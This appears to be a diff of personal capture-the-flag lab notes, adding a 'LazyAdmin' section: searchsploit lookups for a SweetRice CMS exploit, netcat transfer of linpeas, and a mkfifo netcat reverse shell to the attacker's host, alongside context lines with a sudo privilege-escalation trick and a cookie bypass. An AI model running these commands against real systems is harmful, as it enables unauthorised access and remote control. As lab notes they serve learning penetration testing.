@@ -176,3 +176,26 @@ sudo -u#-1 bash
 # take advantage the vuln of that any cookie is OK
 curl http://{target page} --cookie "SessionToken=hoge"
 ```
+
+## LazyAdmin
+
+```bash
+# search on the CMS
+searchsploit SweetRice
+# show target version's vuln
+searchsploit -x php/webapps/40700.html
+# copy mirror
+searchsploit -m php/webapps/40700.html
+
+# upload linpeas
+# execute on target machine (recieve)
+nc -lp 5555 > /dev/shm/linpeas.sh
+# execute on host machine (send)
+c -w 3 {host IP} 5555 < linpeas.sh
+
+# connect tty shell
+rlwrap nc -nlvp {port}
+
+# execute on target machine
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host IP} 5555 >/tmp/f
+```
